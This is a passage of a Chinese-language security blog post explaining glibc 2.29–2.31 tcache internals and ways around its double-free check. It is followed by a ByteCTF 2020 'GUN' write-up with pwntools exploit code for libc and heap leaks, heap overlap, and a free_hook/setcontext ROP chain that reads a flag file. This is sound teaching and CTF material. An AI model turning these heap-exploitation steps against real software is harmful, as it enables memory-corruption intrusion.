(tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_put (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.27</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache<span class="comment">//free+172</span></span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>glibc-2.29中增加了一个check：chunk在放入tcache之前会检查chunk-&gt;key是否为tcache，表示是否已经存在于tcache中，如果已经存在于tcache，则会检查tcache链中是否有跟他相同的堆块。 这对double  free造成了很大的障碍。我认为绕过的一种方法是：如果有存在UFA漏洞或者形成堆重叠等情况，可以篡改chunk-&gt;key，使其e-&gt;key != tcache，就能不进行下面的check。</p>
<h2 id="glibc-2-31姿势学习"><a href="#glibc-2-31姿势学习" class="headerlink" title="glibc-2.31姿势学习"></a>glibc-2.31姿势学习</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>为了增加安全性，2.29 版本以后的 tcache_entry 结构体发生了变化，增加了 key 字段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>



<p>在 free 的时候多了一段检测</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; <span class="comment">//遍历tcache链子中是否存在</span></span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>之后在 tcache_put 函数中多了一段 e-&gt;key=tcache 的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">detect a double free.  */</span></span><br><span class="line">    e-&gt;key = tcache;</span><br><span class="line">    e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">    tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">    ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个流程为：调用 tcache_put 放入 tcache_entry 的时候，其 next  指针和之前变化一致，但是其 key 字段指向了tcache。接下来 free 的时候会检测 key 字段是否为 tcache，如果相等则检测  free 的指针值是否在对应的tcache_entry 链上，如果在则视为程序在 double free，进而终止程序。这里为什么逻辑不是  key 等于 tcache 直接中断，应该是考虑了用户放在 key 字段的数据恰好为 tcache 值的情况。</p>
<p>这种简单的方法使得之前的 tcache 非常随意的 double free 失效了。不过绕过的方式也非常简单，即在构造double free 时提前修改 key 字段的值为任意其他的值。所以相关的所有攻击手法依然可用，并且增加了能够修改key 字段的前提。</p>
<p>还有一个变动就是 tcache 本身的结构体发生了变化：counts 字段由原来的一字节变成了现在的两字节。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p>这个变动使得一些分析堆利用的 gdb 插件解析出现了一定的错误。</p>
<p><strong>fastbin</strong></p>
<p>fastbin 与 tcache 之间存在一种新的 stash 机制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">stash them in the tcache.  */</span></span><br><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">           &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">            *fb = tc_victim-&gt;fd;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当从 fastbin 里取 chunk 时，其余的 chunk 会被依次放入对应的 tcache 中，终止条件时 fastbin 链为空或者 tcache 装满。</p>
<p>其余并无多余变动，要注意做 fastbin 相关利用的时候要先填满对应的 tcache_entry 链。</p>
<p><strong>smallbin</strong></p>
<p>tcache 与 smallbin 之间也增加了 stash 的过程，即向 smallbin 申请的时候，这条 smallbin 链中其余 chunk 会被放到对应 size 的 tcache_entry 链中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">           &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            bck = tc_victim-&gt;bk;</span><br><span class="line">            set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                set_non_main_arena (tc_victim);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            tcache_put (tc_victim, tc_idx);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>tache stash unlink</strong> </p>
<p>这种 smallbin 解链方式类似于远古版本的无检测 unlink ，就此也产生了新的利用方式，目前适用于所有带 tcache 的 glibc 版本。</p>
<p>攻击的前提就是得到堆地址，且可以修改 smallbin 中 chunk 的 bk 字段，这里针对不同情况，可以实现三种效果：</p>
<p><strong>Tcache stash unlink attack</strong>，可以实现等价于 unsortedbin 的作用，即向任意地址写入一个不可控的大数字。其最核心操作，就是先放入 2 个 chunk 到 smallbin，6 个 chunk 到对应的 tcache 。之后在不破坏 fd 的情况下将后放入 smallbin 的 chunk 的 bk 设置为目标地址-  0x10 。这样当再向 smallbin 申请对应 size 的 chunk 时（一般用 calloc，因为 calloc 不请求 tcache ），先放入 smallbin 的 chunk 被分配给用户，然后触发 stash 机制。bck = tc_victim-&gt;bk; 此时的 bck 就是目标地址-0x10，之后  bck-&gt;fd = bin; 也就是*(目标地址-0x10+0x10) =  bin，这样就实现了等价于 unsortedbin 的操作。之后调用 tcache_put 把后放入 smallbin 的 chunk  取出给对应的 tcache ，因为 tcache 之前已经被布置了 6 个 chunk ，这次 put 后达到了阈值，所以也就退出了这次  stash 循环，整个流程就可以正常结束了。</p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>若出现可以实现堆重叠或溢出可以修改 key值即可绕过double free检测</p>
<h2 id="LIBC-2-31利用例子"><a href="#LIBC-2-31利用例子" class="headerlink" title="LIBC-2.31利用例子"></a>LIBC-2.31利用例子</h2><h3 id="BYTECTF-2020-GUN"><a href="#BYTECTF-2020-GUN" class="headerlink" title="BYTECTF-2020-GUN"></a>BYTECTF-2020-GUN</h3><p>下载: </p>
<h4 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h4><p>该题是一个libc-2.31的利用, 且开启了沙箱, 只能orw</p>
<h4 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall shoot@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v4; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  __int64 idx; <span class="comment">// [rsp-14h] [rbp-14h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v7 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( !loaded_arr ) <span class="comment">// 检查是否存在bullet, 然而在释放完毕后也没有对loaded_arr进行清0</span></span><br><span class="line">    <span class="keyword">return</span> puts_0(<span class="string">&quot;No bullet!&quot;</span>);</span><br><span class="line">  sub_1140();</span><br><span class="line">  idx = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)input_n((__int64)&amp;v7);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; loaded_arr &amp;&amp; i &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)idx; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(_QWORD *)loaded_arr;</span><br><span class="line">    sub_1140();</span><br><span class="line">    v3 = *(_QWORD *)loaded_arr;</span><br><span class="line">    sub_1100();</span><br><span class="line">    v4 = loaded_arr;</span><br><span class="line">    loaded_arr = *(_QWORD *)(loaded_arr + <span class="number">8</span>);   <span class="comment">// vul: not set loaded_arr as null, just move next ptr to this</span></span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">16</span>) = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_159A();</span><br><span class="line">  <span class="keyword">return</span> sub_1140();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __usercall load@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v3 = a1;</span><br><span class="line">  sub_1140();</span><br><span class="line">  v2 = input_n((__int64)&amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xD</span> || ptr_arr_flag[<span class="number">3</span> * v2] == <span class="number">0L</span>L || ptr_arr_flag[<span class="number">3</span> * v2] == <span class="number">2L</span>L )</span><br><span class="line">    <span class="keyword">return</span> puts_0(<span class="string">&quot;what??&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( loaded_arr ) <span class="comment">// vul, 不为0时, 直接</span></span><br><span class="line">    *((_QWORD *)&amp;unk_4068 + <span class="number">3</span> * v2) = loaded_arr;</span><br><span class="line">  loaded_arr = (__int64)&amp;unk_4060 + <span class="number">0x18</span> * v2;</span><br><span class="line">  *((_QWORD *)&amp;unk_4060 + <span class="number">3</span> * v2 + <span class="number">2</span>) = <span class="number">2L</span>L;</span><br><span class="line">  <span class="keyword">return</span> puts_0(<span class="string">&quot;Confirm.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在进行shoot的时候, 只是对loaded_arr设置为下一个数据指针, 并没有清0, 若下一个数据指针已经被释放, 即可造成double free</p>
<p>double free poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;I0gan&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x10</span>, <span class="string">&#x27;E&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">buy(<span class="number">0x10</span>, <span class="string">&#x27;F&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x10</span>, <span class="string">&#x27;G&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>先泄漏libc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;I0gan&#x27;</span>)</span><br><span class="line">buy(<span class="number">0x450</span>, <span class="string">&#x27;X&#x27;</span> * <span class="number">0x10</span> + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">buy(<span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">buy(<span class="number">0x10</span>, <span class="string">&#x27;X&#x27;</span> * <span class="number">8</span> +<span class="string">&#x27;\n&#x27;</span>); <span class="comment"># 0</span></span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>) - <span class="number">0x1ebf80</span> - <span class="number">96</span></span><br><span class="line">li(<span class="string">&#x27;libc_base :&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># release</span></span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>那么现在要如何实现堆重叠, 然而在程序逻辑中, 加载后的子弹不会清0, 残余的数据指针仍然还在, 那么若我们能够伪造一个chunk, 释放该chunk, 修改释放后的chunk的fd, 即可实现任意地址写入</p>
<p>实现heap overlap</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set heap chunk overlap</span></span><br><span class="line">n = <span class="number">9</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">	buy(<span class="number">0x80</span>, <span class="string">&#x27;A&#x27;</span> + <span class="built_in">str</span>(_) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">	load(n - i - <span class="number">1</span>)</span><br><span class="line">shoot(n)</span><br><span class="line"></span><br><span class="line">p = p64(<span class="number">0</span>) * <span class="number">0x10</span></span><br><span class="line">p += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) <span class="comment"># fake chunk, because chunk overlap, then we can control it</span></span><br><span class="line">p += p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">buy(<span class="number">0x410</span>, p) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x20</span>, <span class="string">&#x27;20: 0\n&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	buy(<span class="number">0x10</span>, <span class="string">&#x27;10: &#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 2 ~ 8</span></span><br><span class="line"></span><br><span class="line">load(<span class="number">7</span>)</span><br><span class="line">load(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">shoot(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>



<p>泄漏heap且释放我们overlap的大chunk, 以实现我们可以控制伪造chunk的fd</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heap base</span></span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&#x27;The &#x27;</span>)</span><br><span class="line">leak = u64(r(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">heap_base = leak - (<span class="number">0x55962cf186e0</span> - <span class="number">0x55962cf18000</span> )</span><br><span class="line">li(<span class="string">&#x27;heap base&#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>



<p>堆栈迁移至heap中并且打rop</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># stack move to heap and rop</span></span><br><span class="line">	libc.address = libc_base</span><br><span class="line">	setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">0x3d</span></span><br><span class="line">	free_hook  = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	rdx_and_call = libc_base + <span class="number">0x1547a0</span></span><br><span class="line">	pop_rax = libc_base + <span class="number">0x4a550</span></span><br><span class="line">	pop_rdi = libc_base + <span class="number">0x26b72</span></span><br><span class="line">	pop_rsi = libc_base + <span class="number">0x27529</span></span><br><span class="line">	pop_rdx_r12 = libc_base + <span class="number">0x11c1e1</span></span><br><span class="line">	ret = libc_base + <span class="number">0x25679</span></span><br><span class="line">	syscall = libc_base + <span class="number">0x2584d</span></span><br><span class="line"></span><br><span class="line">	p = p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(heap_base + <span class="number">0x750</span> + <span class="number">0x10</span>) <span class="comment"># set rdx</span></span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">	p += p64(setcontext) <span class="comment"># call [rdx + 0x20]</span></span><br><span class="line">	p += <span class="string">b&#x27;./flag\x00\x00&#x27;</span> <span class="comment"># heap_base + 0x750 + 0x38 = 0x788</span></span><br><span class="line">	p = p.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># rdx + 0x90</span></span><br><span class="line"></span><br><span class="line">	p += p64(<span class="number">0</span>)         <span class="comment"># prev_size</span></span><br><span class="line">	p += p64(<span class="number">0x31</span>)      <span class="comment"># size</span></span><br><span class="line">	p += p64(free_hook) <span class="comment"># fd</span></span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">	p += p64(heap_base + <span class="number">0x750</span> + <span class="number">0x100</span>) <span class="comment"># mov rsp, [rdx + 0xa0]</span></span><br><span class="line">	p += p64(ret) <span class="comment"># avoid push rcx</span></span><br><span class="line">	p = p.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	flag_addr = heap_base + <span class="number">0x788</span></span><br><span class="line">	<span class="comment"># open	</span></span><br><span class="line">	rop_open = flat([</span><br><span class="line">	pop_rdi , flag_addr,</span><br><span class="line">	pop_rsi , <span class="number">0</span>,</span><br><span class="line">	libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	])</span><br><span class="line"></span><br><span class="line">	rop_read = flat([</span><br><span class="line">	pop_rdi, <span class="number">3</span>,</span><br><span class="line">	pop_rsi, flag_addr,</span><br><span class="line">	pop_rdx_r12, <span class="number">0x100</span>, <span class="number">0</span>,</span><br><span class="line">	libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	])</span><br><span class="line"></span><br><span class="line">	rop_puts = flat([</span><br><span class="line">	pop_rdi, flag_addr,</span><br><span class="line">	libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	])</span><br><span class="line"></span><br><span class="line">	rop = rop_open</span><br><span class="line">	rop += rop_read</span><br><span class="line">	rop += rop_puts</span><br><span class="line">	p += rop</span><br><span class="line">	p += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">	buy(<span class="number">0x1c0</span>, p) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;setcontext: &#x27;</span> + <span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line">	buy(<span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># for ajust  1</span></span><br><span class="line">	buy(<span class="number">0x20</span>, p64(rdx_and_call) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">	load(<span class="number">0</span>)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	shoot(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

